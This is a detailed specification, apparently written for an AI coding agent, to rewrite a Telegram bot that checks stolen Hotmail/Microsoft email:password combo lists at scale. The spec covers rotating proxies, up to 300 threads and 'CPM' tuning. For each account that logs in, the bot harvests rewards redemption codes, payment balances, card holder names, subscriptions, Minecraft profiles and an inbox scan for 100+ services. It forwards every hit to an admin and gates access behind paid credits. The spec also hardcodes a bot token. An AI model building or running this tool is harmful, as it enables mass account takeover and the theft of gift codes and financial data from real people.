@@ -1,0 +1,1153 @@
+================================================================
+JULES TASK — COMPLETE REWRITE OF bot.py
+REPO: https://github.com/speedhub-bot/ak
+READ ALL FILES: bot.py, flux.py, hit.py, p7.py
+DEPLOYMENT: Railway (no tkinter, no GUI, no rich console,
+            no input(), no CLI menus — pure bot only)
+================================================================
+
+OVERVIEW
+--------
+Rewrite bot.py from scratch as a clean Telegram bot.
+It checks Hotmail/Microsoft accounts using the login flow
+from flux.py. After login it does full capture:
+rewards points, redemption codes from order history,
+Microsoft subscriptions, Minecraft profile, keyword inbox
+scan (100+ services), and country detection.
+No separate PSN/Steam/TikTok/Supercell scanning needed.
+Just keyword scanning covers all of those automatically.
+
+DO NOT invent any URLs, tokens, client IDs, or API keys.
+All values come from the existing .py files provided.
+All APIs in these files are confirmed working in 2026.
+
+================================================================
+SECTION 1 — FILE STRUCTURE (single file: bot.py)
+================================================================
+
+bot.py must contain these sections in order:
+
+1. Imports (single clean block, no duplicates)
+2. Config constants
+3. AkazaDatabase class
+4. SERVICE_KEYWORDS dict (100+ services from inbooxer)
+5. AkazaChecker class (login + full capture)
+6. Bot handlers
+7. bot_main_exec() + __main__
+
+================================================================
+SECTION 2 — IMPORTS
+================================================================
+
+Use exactly these imports (no duplicates):
+
+    import re, json, uuid, sqlite3, logging, asyncio
+    import time, os, random, threading, requests, urllib3
+    from datetime import datetime
+    from pathlib import Path
+    from urllib.parse import quote, unquote, urlparse, parse_qs
+    from bs4 import BeautifulSoup
+    from concurrent.futures import ThreadPoolExecutor
+    from telegram import (Update, InlineKeyboardButton,
+                          InlineKeyboardMarkup)
+    from telegram.ext import (Application, CommandHandler,
+        MessageHandler, CallbackQueryHandler,
+        ContextTypes, filters)
+
+    urllib3.disable_warnings()
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(levelname)s - %(message)s'
+    )
+    logger = logging.getLogger(__name__)
+
+================================================================
+SECTION 3 — CONFIG CONSTANTS
+================================================================
+
+    BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
+    ADMIN_ID = 5944410248
+    DB = "checker.db"
+    MAX_EXECUTOR_WORKERS = 500
+
+    # flux.py login URL — DO NOT CHANGE
+    SFTAG_URL = (
+        'https://login.live.com/oauth20_authorize.srf'
+        '?client_id=00000000402B5328'
+        '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
+        '&scope=service::user.auth.xboxlive.com::MBI_SSL'
+        '&display=touch&response_type=token&locale=en'
+    )
+
+    # Global proxy list
+    PROXIES_LIST = []
+
+    # Global thread pool
+    bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
+
+    db_lock = threading.Lock()
+
+================================================================
+SECTION 4 — AkazaDatabase CLASS
+================================================================
+
+SQLite database with these tables:
+
+    users (user_id, username, first_name, credits,
+           has_access, is_banned, is_mod, total_checks,
+           total_hits, join_date, access_expiry)
+
+    settings (user_id, keywords TEXT, threads INT)
+
+    results (id, user_id, email, status, details JSON,
+             date)
+
+Implement ALL these methods:
+
+    init_db()          — create tables if not exist
+    add_user(uid, username, first_name)
+    is_banned(uid) -> bool
+    has_access(uid) -> bool  (True if ADMIN_ID, or
+                              has_access=1 and not expired
+                              and not banned)
+    is_mod(uid) -> bool      (True if ADMIN_ID or is_mod=1)
+    add_credits(uid, amount)
+    set_credits(uid, amount)
+    reset_credits(uid)       — set to 0
+    use_credit(uid)          — subtract 1, min 0, skip if ADMIN
+    get_credits(uid) -> int
+    grant_access(uid)        — set has_access=1, clear expiry
+    revoke_access(uid)       — set has_access=0
+    grant_timed_access(uid, days) — set has_access=1,
+                                    set access_expiry to
+                                    now + days
+    ban(uid)                 — set is_banned=1
+    unban(uid)               — set is_banned=0
+    set_mod(uid, val)        — set is_mod=val (0 or 1)
+    get_all_user_ids() -> list
+    get_user_info(uid) -> dict (all fields)
+    get_user_settings(uid) -> dict {keywords:[], threads:int}
+    update_settings(uid, keywords=None, threads=None)
+    save_result(uid, email, status, details_dict)
+    user_stats(uid) -> dict {checks, hits, credits}
+    get_global_stats() -> dict {total, active, checks, hits}
+    list_mods() -> list of dicts {uid, username}
+
+================================================================
+SECTION 5 — SERVICE_KEYWORDS DICT
+================================================================
+
+Build a flat dict mapping keyword -> display_name.
+Pull the full service list from inbooxer_hotmail.py
+Config.ALL_SERVICES. For each service include its
+senders list as keywords too.
+
+The dict should cover at minimum:
+  Social: instagram, facebook, twitter, tiktok, snapchat,
+          discord, telegram, reddit, linkedin, twitch,
+          onlyfans, patreon, vk, whatsapp, youtube
+  Streaming: netflix, spotify, disney, hulu, hbo, prime,
+             apple tv, peacock, paramount, tidal, deezer
+  Gaming: xbox, playstation, nintendo, steam, epic, riot,
+          minecraft, roblox, ubisoft, ea, blizzard,
+          valorant, fortnite, pubg, cod, rockstar
+  Finance: paypal, venmo, cashapp, stripe, revolut,
+           wise, coinbase, binance, kraken, robinhood
+  Shopping: amazon, ebay, aliexpress, etsy, walmart,
+            target, shopify, nike, adidas
+  Food: ubereats, doordash, grubhub, deliveroo
+  Travel: uber, lyft, airbnb, booking, expedia
+  Cloud: dropbox, google drive, onedrive, icloud
+  VPN: nordvpn, expressvpn, surfshark, protonvpn
+  Education: coursera, udemy, duolingo, grammarly
+  Productivity: office365, zoom, slack, adobe, canva
+
+Format:
+  SERVICE_KEYWORDS = {
+      "instagram.com": "Instagram",
+      "mail.instagram.com": "Instagram",
+      "facebook.com": "Facebook",
+      "facebookmail.com": "Facebook",
+      "netflix.com": "Netflix",
+      "info@netflix.com": "Netflix",
+      ...
+  }
+
+These are used in keyword inbox scan: for each keyword
+in user's saved keywords list + all SERVICE_KEYWORDS
+senders, search the inbox.
+
+================================================================
+SECTION 6 — AkazaChecker CLASS
+================================================================
+
+class AkazaChecker:
+    def __init__(self, proxy=None):
+        # Create requests.Session
+        # Set verify=False
+        # If proxy is "ip:port" -> http://ip:port
+        # If proxy is "ip:port:user:pass" ->
+        #    http://user:pass@ip:port
+        # Set proxy on session.proxies for both http/https
+        # Set default headers (Edge UA)
+
+------------------------------------------------------------
+METHOD: get_sftag_params(self)
+------------------------------------------------------------
+COPY EXACTLY from flux.py get_urlPost_sFTTag().
+Use SFTAG_URL constant.
+3 retries, 0.1s sleep between.
+Try multiple regex patterns for PPFT:
+  re.search('value=\\\\"(.+?)\\\\"', text, re.S)
+  re.search('value="(.+?)"', text, re.S)
+  re.search("sFTTag:'(.+?)'", text, re.S)
+  re.search('sFTTag:"(.+?)"', text, re.S)
+  re.search('name="PPFT".*?value="(.+?)"', text, re.S)
+Try multiple regex for urlPost:
+  re.search('"urlPost":"(.+?)"', text, re.S)
+  re.search("urlPost:'(.+?)'", text, re.S)
+  re.search('<form.*?action="(.+?)"', text, re.S)
+Replace &amp; -> & in urlPost.
+Returns (urlPost, ppft) or (None, None).
+
+------------------------------------------------------------
+METHOD: do_login(self, email, password, urlPost, ppft)
+------------------------------------------------------------
+COPY EXACTLY from flux.py get_xbox_rps().
+POST to urlPost with:
+  data = {login: email, loginfmt: email,
+          passwd: password, PPFT: ppft}
+  headers: Content-Type: application/x-www-form-urlencoded
+           UA: Chrome/91 (from flux.py)
+  allow_redirects=True, timeout=10, verify=False
+3 retries.
+
+CHECK RESPONSES in this order:
+
+1. If '#' in response.url AND url != SFTAG_URL:
+   Extract access_token from URL fragment.
+   If token found and token != 'None' -> return ('TOKEN', token, session)
+
+2. elif 'cancel?mkt=' in response.text:
+   Try the recovery flow (COPY from flux.py):
+   - Extract ipt, pprid, uaid from form
+   - POST to fmHF action
+   - Extract recoveryCancel returnUrl
+   - GET that URL, extract access_token from fragment
+   - If found -> return ('TOKEN', token, session)
+   If not found -> return ('2FA', None, session)
+
+3. elif any 2FA indicators in text:
+   ['recover?mkt', 'account.live.com/identity/confirm?mkt',
+    'Email/Confirm?mkt', '/Abuse?mkt=']
+   -> return ('2FA', None, session)
+
+4. elif any bad creds indicators in text (lowercase):
+   ['password is incorrect', "account doesn't exist",
+    "that microsoft account doesn't exist",
+    'sign in to your microsoft account',
+    'tried to sign in too many times',
+    'help us protect your account']
+   -> return ('BAD', None, session)
+
+Default -> return ('ERROR', None, session)
+
+------------------------------------------------------------
+METHOD: handle_fmhf(self, resp)
+------------------------------------------------------------
+COPY from bot.py existing handle_forms().
+Up to 5 iterations. If fmHF form found, POST hidden
+inputs to action URL. Break if no form found.
+Returns response.
+
+------------------------------------------------------------
+METHOD: get_rewards_points(self)
+------------------------------------------------------------
+The session already has Rewards cookies from login.
+Try 3 methods in order (from p7.py):
+
+Method 1:
+  GET https://rewards.bing.com/api/getuserinfo
+  Headers: UA Chrome/120 Edge, Referer: rewards.bing.com
+  Parse data['availablePoints'] or
+       data['dashboard']['userStatus']['availablePoints']
+
+Method 2 (if method 1 fails):
+  GET https://www.bing.com/rewardsapp/flyoutHub?format=json
+  Parse data['userInfo']['balance']
+
+Method 3 (if still fails):
+  GET https://rewards.bing.com
+  Apply handle_fmhf() if fmHF present.
+  re.search(r'"availablePoints"\s*:\s*(\d+)', text)
+  Only accept if 0 <= points <= 500000.
+
+Returns int (points) or 0.
+
+------------------------------------------------------------
+METHOD: get_redemption_codes(self)
+------------------------------------------------------------
+COPY EXACTLY from flux.py login_and_scrape() starting
+at "Get redemption codes from order history".
+
+URL: https://rewards.bing.com/redeem/orderhistory
+GET with Referer: https://rewards.bing.com/
+
+If response has 'fmHF' or 'JavaScript required':
+  - Find form id='fmHF'
+  - Collect all hidden inputs
+  - If action starts with '/' prefix with
+    'https://login.live.com'
+  - POST form data
+  - Re-GET the orderhistory URL
+
+Parse HTML with BeautifulSoup.
+
+Extract __RequestVerificationToken from hidden input.
+
+Find table.table -> tbody -> tr rows.
+
+CODE PATTERNS (all 3):
+  5-part: r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
+  4-part: r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
+  3-part: r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
+
+EXCLUDE_WORDS set (from flux.py):
+  SWEEPSTAKES, STATUS, WINORDER, CONTEST, PLAGUE,
+  REQUIEM, CUSTOM, BUNDLEORDER, SURFACE, PROORDER,
+  SERIES, POINTS, DONATION, CHILDREN, RESEARCH,
+  HOSPITALORDE, EDUCATION, EMPLOYMENTOR, RIGHTS,
+  YOUORDER, SEDSORDER, ATAORDER, CARDORDER, MICROSOFT,
+  PRESENTKORT, KRORDER, OFT-PRE, DIGITAL, COINSORDER,
+  MOEDAS, OVERWATCHORD, MONEDASORDER, ASSINATURA,
+  GRATUITA, SPOTIFY, PREMIUM, MESESORDER, PRESENTE,
+  RESALET, NOURORDER, FOUNDATIONOR, YACOUB, LEAGUE,
+  LEGENDS, RPORDER, OVERWATCH, GAME, PASS, MINECOINS,
+  ROBUX, GIFT, CARD, ORDER, CODE, FOUND, DIGITAL-CODE,
+  REDEMPTION, REDEEM, DOWNLOAD, INSTANT, DELIVERY,
+  ONLINE, ACCESS, CONTENT, DLC, EXPANSION, SEASON,
+  TOKEN, CURRENCY, VIRTUAL, ITEM
+
+For each row with OrderDetails_ button:
+  - POST to data-actionurl with __RequestVerificationToken
+  - Try extractions in this order (ALL from flux.py):
+    a. resendSuccess div -> tango-credential-key/value
+       matching 'CODE' or 'PIN'
+    b. re.search(code_pattern, html) for each pattern
+    c. PIN: r'PIN\s*:\s*([A-Z0-9]{4}-...)'
+    d. CODE: r'CODE\s*:\s*([A-Z0-9]{4}-...)'
+    e. <pre>/<code> tags
+    f. data-clipboard-text button attrs
+    g. fallback: all 3 code patterns on full HTML
+  - Also check for Redemption URL for gift cards:
+    r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>'
+  - Detect category using detect_category() (see below)
+  - Skip codes with '*' or in EXCLUDE_WORDS
+
+For rows WITHOUT OrderDetails_ button (fallback):
+  Search cells[3] text with all 3 code patterns.
+  Same exclude/validate logic.
+
+If no table found, search full page text with patterns.
+
+Return list of dicts:
+  [{code, category, info, redemption_url, date}, ...]
+
+------------------------------------------------------------
+METHOD: detect_category(self, title, row_text='')
+------------------------------------------------------------
+COPY from flux.py detect_category_from_title().
+Priority order:
+  overwatch -> 'Overwatch'
+  sea of thieves / ancient coins -> 'Sea of Thieves'
+  roblox / robux -> 'Roblox'
+  league of legends / riot points -> 'League of Legends'
+  game pass / gamepass -> 'Game Pass'
+  minecraft / minecoins -> 'Minecraft'
+  gift card / amazon / steam / xbox / nintendo /
+  playstation / starbucks / walmart / spotify -> 'Gift Card'
+Returns 'Unknown' if none match.
+
+------------------------------------------------------------
+METHOD: get_microsoft_subs(self)
+------------------------------------------------------------
+COPY from hit.py check_microsoft_subscriptions().
+
+Silent token for payment API:
+  user_id = uuid4 hex [:16]
+  state = json.dumps({"userId": user_id, "scopeSet":"pidl"})
+  URL: https://login.live.com/oauth20_authorize.srf
+       ?client_id=000000000004773A
+       &response_type=token
+       &scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete
+       &redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth
+       &state={quote(state)}
+       &prompt=none
+  Referer: https://account.microsoft.com/
+  GET with allow_redirects=True, timeout=20
+  Extract access_token from r.text + r.url
+
+If no payment token -> return {"status":"FREE","subs":[]}
+
+Payment headers:
+  Authorization: MSADELEGATE1.0="{payment_token}"
+  ms-cV: uuid4
+  Origin/Referer: https://account.microsoft.com/
+
+Check balance:
+  GET https://paymentinstruments.mp.microsoft.com/v6.0/
+      users/me/paymentInstrumentsEx
+      ?status=active,removed&language=en-US
+  Parse "balance": X.XX -> store as "$X.XX"
+  Parse credit card holder name
+
+Check subscriptions:
+  GET https://paymentinstruments.mp.microsoft.com/v6.0/
+      users/me/paymentTransactions
+  Search response for these keywords (from hit.py):
+    'Xbox Game Pass Ultimate' -> GAME PASS ULTIMATE
+    'PC Game Pass'            -> PC GAME PASS
+    'Xbox Game Pass'          -> GAME PASS
+    'EA Play'                 -> EA PLAY
+    'Xbox Live Gold'          -> XBOX LIVE GOLD
+    'Microsoft 365 Family'    -> M365 FAMILY
+    'Microsoft 365 Personal'  -> M365 PERSONAL
+    'Office 365'              -> OFFICE 365
+    'OneDrive'                -> ONEDRIVE
+  For each found:
+    Extract nextRenewalDate, autoRenew, totalAmount,
+    currency. Calculate days_remaining. Mark is_expired
+    if days < 0.
+
+Returns:
+  {"status": "PREMIUM"/"FREE",
+   "subs": [...],
+   "balance": "$X",
+   "card": "Name"}
+
+------------------------------------------------------------
+METHOD: get_profile(self, access_token, cid)
+------------------------------------------------------------
+GET https://substrate.office.com/profileb2/v2.0/me/V1Profile
+Headers:
+  Authorization: Bearer {access_token}
+  X-AnchorMailbox: CID:{cid}
+  User-Agent: Outlook-Android/2.0
+  Accept: application/json
+Parse displayName and location/country from JSON.
+Try accounts[0].location first, then location.country,
+then top-level 'country'.
+Returns (name, country).
+
+------------------------------------------------------------
+METHOD: get_minecraft(self, access_token)
+------------------------------------------------------------
+This needs a separate Xbox auth chain.
+The access_token from flux.py login IS an Xbox Live RPS
+token (MBI_SSL scope). Use it directly.
+
+Step 1 - XBL:
+  POST https://user.auth.xboxlive.com/user/authenticate
+  Headers: Content-Type: application/json,
+           Accept: application/json
+  Body JSON:
+    {
+      "Properties": {
+        "AuthMethod": "RPS",
+        "SiteName": "user.auth.xboxlive.com",
+        "RpsTicket": "d={access_token}"
+      },
+      "RelyingParty": "http://auth.xboxlive.com",
+      "TokenType": "JWT"
+    }
+  Extract: Token, DisplayClaims.xui[0].uhs (userhash)
+
+Step 2 - XSTS:
+  POST https://xsts.auth.xboxlive.com/xsts/authorize
+  Body JSON:
+    {
+      "Properties": {
+        "SandboxId": "RETAIL",
+        "UserTokens": ["{xbl_token}"]
+      },
+      "RelyingParty": "rp://api.minecraftservices.com/",
+      "TokenType": "JWT"
+    }
+  Extract: Token (xsts_token)
+
+Step 3 - Minecraft login:
+  POST https://api.minecraftservices.com/authentication/login_with_xbox
+  Body JSON:
+    {"identityToken": "XBL3.0 x={userhash};{xsts_token}"}
+  Extract: access_token (mc_token)
+
+Step 4 - Profile:
+  GET https://api.minecraftservices.com/minecraft/profile
+  Header: Authorization: Bearer {mc_token}
+  If 200: return {"owned": True, "username": name,
+                  "uuid": id, "capes": [alias,...]}
+  Else: return {"owned": False}
+
+Wrap all in try/except, return {"owned": False} on error.
+
+------------------------------------------------------------
+METHOD: scan_inbox(self, access_token, cid, user_keywords)
+------------------------------------------------------------
+This is the FULL inbox scan. Uses Outlook search API
+(cookie-based via the session, plus Bearer header).
+
+AUTH HEADERS for all calls:
+  Authorization: Bearer {access_token}
+  X-AnchorMailbox: CID:{cid}
+  User-Agent: Outlook-Android/2.0
+  Content-Type: application/json
+  Accept: application/json
+
+SEARCH URL: https://outlook.live.com/search/api/v2/query
+
+SEARCH PAYLOAD template:
+  {
+    "Cvid": str(uuid4()),
+    "Scenario": {"Name": "owa.react"},
+    "TimeZone": "UTC",
+    "TextDecorations": "Off",
+    "EntityRequests": [{
+      "EntityType": "Conversation",
+      "ContentSources": ["Exchange"],
+      "Filter": {"Or": [{"Term":
+        {"DistinguishedFolderName": "msgfolderroot"}}]},
+      "From": 0,
+      "Query": {"QueryString": "{keyword}"},
+      "Size": 5,
+      "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+    }]
+  }
+
+SCAN PROCESS:
+  Build a combined keyword list:
+    combined = list(SERVICE_KEYWORDS.keys()) + user_keywords
+  Remove duplicates.
+  For each keyword in combined:
+    POST the search payload.
+    If status 200 and Total > 0:
+      - Get the display name: SERVICE_KEYWORDS.get(kw, kw)
+      - Add to results dict: {display_name: count}
+  Return dict of {service_name: count}.
+  (e.g. {"Netflix": 3, "PayPal": 12, "Steam": 1})
+
+NOTE: Batch keywords — don't make one request per
+service keyword (too slow). Instead group them:
+  Search 5-10 keywords at a time using OR queries:
+  QueryString: "netflix.com OR hulu.com OR spotify.com"
+  If Total > 0 then do individual lookups for that batch
+  to determine which specific ones matched.
+  This gives much better CPM.
+
+------------------------------------------------------------
+METHOD: check(self, email, password, user_keywords=[])
+------------------------------------------------------------
+Full check flow. Returns a result dict.
+
+STEP 1: Get SFTAG params.
+  urlPost, ppft = self.get_sftag_params()
+  If None -> return {status:'error'}
+
+STEP 2: Login.
+  status, token, session = self.do_login(
+      email, password, urlPost, ppft)
+  if status == 'BAD' -> return {status:'bad'}
+  if status == '2FA' -> return {status:'2fa'}
+  if status == 'ERROR' -> return {status:'error'}
+  if status == 'TOKEN' and token:
+    access_token = token
+
+STEP 3: Get CID from session cookies.
+  cid = ''
+  for cookie in self.session.cookies:
+      if cookie.name == 'MSPCID':
+          cid = cookie.value.upper()
+          break
+
+STEP 4: Run all captures (wrap each in try/except):
+  points = self.get_rewards_points()
+  codes  = self.get_redemption_codes()
+  subs   = self.get_microsoft_subs()
+  name, country = self.get_profile(access_token, cid)
+  mc     = self.get_minecraft(access_token)
+  inbox  = self.scan_inbox(access_token, cid,
+                           user_keywords)
+
+STEP 5: Return full result:
+  {
+    'status': 'hit',
+    'email': email,
+    'password': password,
+    'name': name,
+    'country': country,
+    'pts': points,
+    'codes': codes,        # list of code dicts
+    'subs': subs,          # dict from get_microsoft_subs
+    'mc': mc,              # dict from get_minecraft
+    'inbox': inbox,        # dict from scan_inbox
+  }
+
+================================================================
+SECTION 7 — BOT HANDLERS
+================================================================
+
+------------------------------------------------------------
+/start command + back button
+------------------------------------------------------------
+Register user in DB if new.
+If banned -> return silently.
+Show welcome message with inline keyboard:
+  [🔍 Check] [⚙️ Settings]
+  [📊 Stats] [🌐 Proxies]
+  [🛠 Admin] (only if is_mod)
+
+------------------------------------------------------------
+handle_combo — main checking handler
+------------------------------------------------------------
+Triggered by:
+  - Text message matching email:password pattern
+  - .txt file upload without "prox" in caption
+
+Check:
+  if banned or not has_access -> return
+  if credits == 0 and not ADMIN -> reply "no credits"
+
+Parse lines: split by newline, keep lines with ':'
+If 0 lines -> return
+
+Settings = db.get_user_settings(uid)
+threads = min(settings['threads'], 300)
+         if no proxies, cap at 10
+keywords = settings['keywords']
+
+Send status message: "🔄 Initializing..."
+hits=0, bad=0, tfa=0, errors=0, checked=0
+start_time = time.time()
+last_hits = [] (keep last 5 hit emails)
+results_file = f"hits_{uid}_{int(time.time())}.txt"
+
+def run_check(line):
+    try:
+        e, p = line.split(':', 1)
+        proxy = None
+        if PROXIES_LIST:
+            proxy = random.choice(PROXIES_LIST)
+        checker = AkazaChecker(proxy=proxy)
+        return checker.check(e.strip(), p.strip(), keywords)
+    except Exception as ex:
+        return {'status': 'error'}
+
+loop = asyncio.get_running_loop()
+semaphore = asyncio.Semaphore(threads)
+update_lock = asyncio.Lock()
+last_update = 0
+
+async def sem_worker(line):
+  nonlocal hits, bad, tfa, errors, checked, last_update
+  async with semaphore:
+    data = await loop.run_in_executor(
+        bot_executor, run_check, line)
+    if not data: return
+    checked += 1
+    db.use_credit(uid)
+    db.save_result(uid, data.get('email',''), data['status'], data)
+    st = data['status']
+
+    if st == 'hit':
+      hits += 1
+      d = data
+      # Build tiered label:
+      pts = d.get('pts', 0)
+      tier = ('💎 ULTRA HIT' if pts >= 20000
+              else '⭐ PREMIUM HIT' if pts >= 7000
+              else '🎯 HIT')
+      # Build hit message:
+      msg = (f"{tier}\n"
+             f"📧 `{d['email']}`\n"
+             f"🔑 `{d['password']}`\n"
+             f"👤 {d.get('name','N/A')} | "
+             f"🌍 {d.get('country','N/A')}\n"
+             f"⭐ Points: `{pts}`\n")
+      # Codes grouped by category:
+      codes = d.get('codes', [])
+      if codes:
+        cat_map = {}
+        for c in codes:
+          cat = c.get('category','Unknown')
+          cat_map.setdefault(cat,[]).append(c)
+        for cat, clist in cat_map.items():
+          code_strs = []
+          for c in clist:
+            s = f"`{c['code']}`"
+            if c.get('redemption_url'):
+              s += f" [Redeem]({c['redemption_url']})"
+            code_strs.append(s)
+          msg += f"🎮 {cat}: {', '.join(code_strs)}\n"
+      # Microsoft subs:
+      subs = d.get('subs', {})
+      active = [s['name'] for s in subs.get('subs',[])
+                if not s.get('is_expired')]
+      if active:
+        msg += f"🎮 MS Subs: {', '.join(active)}\n"
+      if subs.get('balance'):
+        msg += f"💳 Balance: {subs['balance']}\n"
+      # Minecraft:
+      mc = d.get('mc', {})
+      if mc.get('owned'):
+        msg += f"⛏️ Minecraft: `{mc['username']}`\n"
+      # Inbox hits:
+      inbox = d.get('inbox', {})
+      if inbox:
+        top5 = list(inbox.items())[:5]
+        sv = ', '.join(f"{k}({v})" for k,v in top5)
+        msg += f"📬 Inbox: {sv}\n"
+        if len(inbox) > 5:
+          msg += f"  ...+{len(inbox)-5} more\n"
+
+      last_hits.append(d['email'])
+      if len(last_hits) > 5: last_hits.pop(0)
+
+      # Country flag line
+      country = d.get('country','')
+      if country:
+        msg += f"🌍 Country: {country}\n"
+
+      # Send to user
+      try:
+        await c.bot.send_message(
+            uid, msg, parse_mode='Markdown',
+            disable_web_page_preview=True)
+      except: pass
+      # Send to admin if not admin
+      if uid != ADMIN_ID:
+        try:
+          await c.bot.send_message(
+              ADMIN_ID,
+              f"📢 User {uid} hit:\n{msg}",
+              parse_mode='Markdown',
+              disable_web_page_preview=True)
+        except: pass
+      # Save to results file
+      with open(results_file,'a') as f:
+        f.write(f"{d['email']}:{d['password']} | "
+                f"Pts:{pts} | Country:{country} | "
+                f"Codes:{len(codes)} | "
+                f"Subs:{len(active)} | "
+                f"Inbox:{len(inbox)}\n")
+
+    elif st == '2fa':
+      tfa += 1
+      # Save 2FA to separate file
+      with open(f"tfa_{uid}.txt",'a') as f:
+        f.write(f"{data.get('email','')}:"
+                f"{data.get('password','')}\n")
+    elif st == 'error':
+      errors += 1
+    else:
+      bad += 1
+
+    async with update_lock:
+      now = time.time()
+      if now - last_update > 2.0 or checked == len(lines):
+        last_update = now
+        el = now - start_time
+        cpm = int((checked/el)*60) if el>0 else 0
+        prg = (
+          f"🔄 **Live Check**\n\n"
+          f"📊 `{checked}/{len(lines)}`\n"
+          f"🎯 Hits: `{hits}` | "
+          f"💀 Bad: `{bad}`\n"
+          f"🔒 2FA: `{tfa}` | "
+          f"❌ Errors: `{errors}`\n"
+          f"⚡ CPM: `{cpm}`\n\n"
+          f"🕒 Last Hits:\n"
+          f"`{'|'.join(last_hits) or 'None'}`"
+        )
+        try:
+          await status_msg.edit_text(
+              prg, parse_mode='Markdown')
+        except: pass
+
+await asyncio.gather(*(sem_worker(l) for l in lines))
+
+# Send results file if hits > 0
+if hits > 0 and os.path.exists(results_file):
+  with open(results_file,'rb') as f:
+    await u.message.reply_document(
+        f, caption=f"✅ Done! Hits: `{hits}`",
+        parse_mode='Markdown')
+  os.remove(results_file)
+else:
+  await u.message.reply_text(
+      f"✅ Done!\n🎯 Hits: `{hits}` | "
+      f"💀 Bad: `{bad}` | 🔒 2FA: `{tfa}`",
+      parse_mode='Markdown')
+
+# Send 2FA file if any
+if tfa > 0 and os.path.exists(f"tfa_{uid}.txt"):
+  with open(f"tfa_{uid}.txt",'rb') as f:
+    await u.message.reply_document(
+        f, caption=f"🔒 2FA accounts: `{tfa}`",
+        parse_mode='Markdown')
+  os.remove(f"tfa_{uid}.txt")
+
+------------------------------------------------------------
+handle_proxies
+------------------------------------------------------------
+Triggered by .txt file upload with "prox" in caption.
+Parse lines, support formats:
+  ip:port
+  ip:port:user:pass
+  http://ip:port
+  socks5://ip:port
+Store raw strings in PROXIES_LIST.
+Reply: "✅ Loaded N proxies."
+
+------------------------------------------------------------
+cb_handler — callback query handler
+------------------------------------------------------------
+Handle buttons: check, settings, stats, proxies,
+                admin, back
+
+check -> show "Send email:pass list or .txt file"
+settings -> show threads, keywords
+stats -> show user stats
+proxies -> show proxy count
+admin -> show global stats (mods only)
+back -> show start menu
+
+------------------------------------------------------------
+/threads N command
+------------------------------------------------------------
+Set threads 1-300 for user. Save to DB settings.
+
+------------------------------------------------------------
+/keywords kw1,kw2,kw3 command
+------------------------------------------------------------
+Save keyword list to DB settings.
+
+------------------------------------------------------------
+/addkw kw command
+------------------------------------------------------------
+Append single keyword to existing list.
+
+------------------------------------------------------------
+/clearkw command
+------------------------------------------------------------
+Clear all keywords.
+
+------------------------------------------------------------
+/check email:password command
+------------------------------------------------------------
+Single account check. Run check, show full result.
+
+------------------------------------------------------------
+admin_cmd_handler
+------------------------------------------------------------
+Prefix: !!
+Accessible to mods. Owner-only commands marked below.
+
+ALL COMMANDS:
+
+!!help
+  Show all commands with syntax.
+
+!!addcredits [uid] [amount]
+  db.add_credits(uid, amount)
+
+!!setcredits [uid] [amount]
+  db.set_credits(uid, amount)
+
+!!resetcredits [uid]
+  db.reset_credits(uid)
+
+!!grant [uid]
+  db.grant_access(uid)
+  Reply: "✅ Granted access to {uid}"
+
+!!revoke [uid]
+  db.revoke_access(uid)
+  Reply: "✅ Revoked access from {uid}"
+
+!!addaccess [uid] [days]
+  db.grant_timed_access(uid, days)
+  Reply: "✅ Granted {days} days to {uid}"
+
+!!ban [uid]
+  db.ban(uid)
+
+!!unban [uid]
+  db.unban(uid)
+
+!!mod [uid]           (OWNER ONLY — ADMIN_ID only)
+  db.set_mod(uid, 1)
+
+!!unmod [uid]         (OWNER ONLY)
+  db.set_mod(uid, 0)
+
+!!listmods
+  List all mods from db.list_mods()
+
+!!info [uid]
+  db.get_user_info(uid) -> show all fields
+
+!!stats
+  db.get_global_stats() -> show totals
+
+!!broadcast [message]
+  Get all user IDs from db.get_all_user_ids()
+  For each uid: try send message (skip errors)
+  Report: "✅ Broadcast sent to N users"
+
+!!setthreads [uid] [n]
+  db.update_settings(uid, threads=n)
+
+!!addproxies
+  (user can also upload file, but this lets admin
+   paste proxies directly as the message text after
+   the command — parse lines from the rest of the msg)
+
+In admin_cmd_handler, check:
+  if uid == ADMIN_ID -> all commands allowed
+  elif db.is_mod(uid) -> all except !!mod / !!unmod
+  else -> return silently
+
+================================================================
+SECTION 8 — PROXY SUPPORT
+================================================================
+
+Format proxy string for session:
+
+def format_proxy(proxy_str):
+    proxy_str = proxy_str.strip()
+    if proxy_str.startswith(('http://','https://','socks')):
+        return proxy_str
+    parts = proxy_str.split(':')
+    if len(parts) == 4:
+        ip, port, user, pwd = parts
+        return f'http://{user}:{pwd}@{ip}:{port}'
+    elif len(parts) == 2:
+        return f'http://{proxy_str}'
+    return proxy_str
+
+In AkazaChecker.__init__:
+    if proxy:
+        p = format_proxy(proxy)
+        self.session.proxies = {'http': p, 'https': p}
+
+================================================================
+SECTION 9 — THREAD MANAGEMENT & CPM OPTIMIZATION
+================================================================
+
+For maximum CPM on Railway:
+
+1. bot_executor = ThreadPoolExecutor(max_workers=500)
+   This is global, shared across all users.
+
+2. Per-check semaphore based on user's thread setting.
+   Default threads = 10 (no proxy), up to 300 (with proxy).
+
+3. AkazaChecker session timeout = 10s for login,
+   8s for rewards/points APIs, 10s for code fetch,
+   10s for inbox search. Never more than 15s per call.
+
+4. In scan_inbox, use batched OR queries:
+   Group SERVICE_KEYWORDS into batches of 8.
+   QueryString: "kw1 OR kw2 OR kw3 ... OR kw8"
+   If Total > 0 in batch, do individual lookups for that
+   batch only. This reduces API calls by ~8x.
+
+5. Skip profile/Minecraft/subs if check_mode is basic.
+   Add a "fast mode" option: only checks points + codes.
+   User can toggle with /fastmode command.
+   Default is full mode.
+
+================================================================
+SECTION 10 — RAILWAY DEPLOYMENT REQUIREMENTS
+================================================================
+
+1. NO tkinter, NO GUI, NO rich console, NO input(),
+   NO CLI menus, NO os.system('cls'), NO print_banner().
+
